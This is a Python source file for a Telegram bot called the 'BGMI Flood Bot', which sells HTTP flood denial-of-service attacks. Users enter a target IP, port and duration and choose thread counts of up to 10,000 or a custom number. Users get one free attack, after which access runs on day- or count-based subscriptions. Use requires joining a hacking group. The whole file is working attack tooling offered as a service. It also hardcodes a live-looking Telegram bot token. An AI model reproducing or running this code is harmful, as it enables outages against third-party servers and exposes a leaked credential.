import requests
import threading
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Constants for thread counts
LOW_THREADS = 1500
MEDIUM_THREADS = 5000
HIGH_THREADS = 10000

# Telegram bot token
TOKEN = '6945433492:AAHPvr6R1tqKiyyzAtZ2N2kcOy6AncEe5QY'
bot = telebot.TeleBot(TOKEN)

# Admins and allowed users
admins = ['5460343986', '6048033257']
allowed_users = ['user1', 'user2']

# Group that users must join
FORCE_JOIN_GROUP = '@INDIAN_HACKER_GROUP'

# Dictionary to store attack configurations and user subscriptions
attack_configs = {}
user_subscriptions = {}

# Function to send HTTP flood
def send_http_flood(target_ip, target_port, stop_event):
    url = f'http://{target_ip}:{target_port}'
    while not stop_event.is_set():
        try:
            requests.get(url)
        except:
            pass
        time.sleep(0.01)

# Function to handle admin commands
def handle_admin_command(command):
    parts = command.split()
    if len(parts) < 2:
        return 'Invalid command'

    if parts[1] == 'adduser':
        if len(parts) != 4:
            return 'Invalid command. Usage: /admin adduser <user_id> <days/count>'
        user_id = parts[2]
        try:
            duration = int(parts[3][:-1])
            if parts[3][-1].lower() == 'd':
                if user_id not in user_subscriptions:
                    user_subscriptions[user_id] = {'count': None, 'expiry': time.time() + duration * 86400}
                allowed_users.append(user_id)
                return f'User {user_id} added successfully for {duration} days'
            else:
                if user_id not in user_subscriptions:
                    user_subscriptions[user_id] = {'count': duration, 'expiry': None}
                allowed_users.append(user_id)
                return f'User {user_id} added successfully for {duration} uses'
        except ValueError:
            return 'Invalid duration'

    elif parts[1] == 'removeuser':
        if len(parts) != 3:
            return 'Invalid command'
        user_id = parts[2]
        if user_id in allowed_users:
            allowed_users.remove(user_id)
            user_subscriptions.pop(user_id, None)
            return f'User {user_id} removed successfully'
        else:
            return f'User {user_id} is not in the allowed users list'
    else:
        return 'Invalid command'

# Function to check if user is authorized
def is_user_authorized(user_id):
    if user_id in allowed_users:
        if user_id in user_subscriptions:
            subscription = user_subscriptions[user_id]
            if subscription['expiry'] and time.time() > subscription['expiry']:
                allowed_users.remove(user_id)
                return False
            if subscription['count'] and subscription['count'] <= 0:
                allowed_users.remove(user_id)
                return False
            return True
        return True
    return False

# Function to check if user has joined the group
def has_user_joined_group(user_id):
    try:
        member = bot.get_chat_member(FORCE_JOIN_GROUP, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to handle the attack
def handle_attack(target_ip, target_port, time_to_run, threads):
    stop_event = threading.Event()
    threads_list = []

    for _ in range(threads):
        t = threading.Thread(target=send_http_flood, args=(target_ip, target_port, stop_event))
        threads_list.append(t)
        t.start()

    time.sleep(time_to_run)
    stop_event.set()

    for t in threads_list:
        t.join()

# Function to handle incoming telegram messages
@bot.message_handler(commands=['bgmi'])
def handle_message(message):
    user_id = str(message.from_user.id)

    if not has_user_joined_group(user_id):
        bot.reply_to(message, f"You must join the group {FORCE_JOIN_GROUP} to use this bot.")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, 'Usage: /bgmi [TARGET IP] [TARGET PORT] [TIME]')
        return

    target_ip = parts[1]
    target_port = int(parts[2])
    time_to_run = int(parts[3])

    # First time free usage
    if user_id not in user_subscriptions:
        user_subscriptions[user_id] = {'count': 1, 'expiry': None}
    else:
        if not is_user_authorized(user_id):
            bot.reply_to(message, "You are not authorized to use this bot or your subscription has expired.")
            return

    attack_id = message.chat.id

    attack_configs[attack_id] = {
        'ip': target_ip,
        'port': target_port,
        'time': time_to_run
    }

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('Low', callback_data=f'{attack_id}_LOW'))
    markup.add(InlineKeyboardButton('Medium', callback_data=f'{attack_id}_MEDIUM'))
    markup.add(InlineKeyboardButton('High', callback_data=f'{attack_id}_HIGH'))
    markup.add(InlineKeyboardButton('Custom', callback_data=f'{attack_id}_CUSTOM'))
    markup.add(InlineKeyboardButton('Cancel', callback_data=f'{attack_id}_CANCEL'))

    response = (
        f"Target IP: {target_ip}\n"
        f"Target Port: {target_port}\n"
        f"Time: {time_to_run}\n\n"
        "Select the thread level:"
    )

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    attack_id, action = call.data.split('_')
    attack_id = int(attack_id)

    if action == 'CANCEL':
        bot.send_message(call.message.chat.id, "Attack cancelled.")
        return

    if action == 'CUSTOM':
        bot.send_message(call.message.chat.id, "Please enter the number of threads:")
        bot.register_next_step_handler(call.message, custom_threads, attack_id)
        return

    threads = {
        'LOW': LOW_THREADS,
        'MEDIUM': MEDIUM_THREADS,
        'HIGH': HIGH_THREADS
    }.get(action)

    config = attack_configs[attack_id]
    threading.Thread(target=handle_attack, args=(config['ip'], config['port'], config['time'], threads)).start()
    bot.send_message(call.message.chat.id, f"Attack started with {threads} threads for {config['time']} seconds.")

    user_id = str(call.from_user.id)
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        if subscription['count'] is not None:
            subscription['count'] -= 1

def custom_threads(message, attack_id):
    try:
        threads = int(message.text)
    except ValueError:
        bot.send_message(message.chat.id, "Invalid number of threads. Attack cancelled.")
        return

    config = attack_configs[attack_id]
    threading.Thread(target=handle_attack, args=(config['ip'], config['port'], config['time'], threads)).start()
    bot.send_message(message.chat.id, f"Attack started with {threads} threads for {config['time']} seconds.")

    user_id = str(message.from_user.id)
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        if subscription['count'] is not None:
            subscription['count'] -= 1

# Command handler for admin commands
@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, 'Unauthorized to run admin commands')
        return

    response = handle_admin_command(message.text)
    bot.reply_to(message, response)

# Command handler for the start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "Welcome to the BGMI Flood Bot!\n\n"
        "Here are the commands you can use:\n"
        "/bgmi [TARGET IP] [TARGET PORT] [TIME] - Initiate an attack setup\n"
        "/admin adduser <user_id> <days/count> - Add a user to the allowed users list (admin only)\n"
        "/admin removeuser <user_id> - Remove a user from the allowed users list (admin only)\n"
        "/help - Show this help message\n\n"
        "You must join the group @INDIAN_HACKER_GROUP to use this bot."
    )
    bot.send_message(message.chat.id, welcome_text)

# Command handler for the help command
@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "Bot Manual:\n"
        "/bgmi [TARGET IP] [TARGET PORT] [TIME] - Initiate an attack setup\n"
        "/admin adduser <user_id> <days/count> - Add a user to the allowed users list (admin only)\n"
        "/admin removeuser <user_id> - Remove a user from the allowed users list (admin only)\n"
        "/help - Show this help message\n\n"
        "You must join the group @INDIAN_HACKER_GROUP to use this bot."
    )
    bot.send_message(message.chat.id, help_text)

# Start telegram bot
bot.polling(none_stop=True)
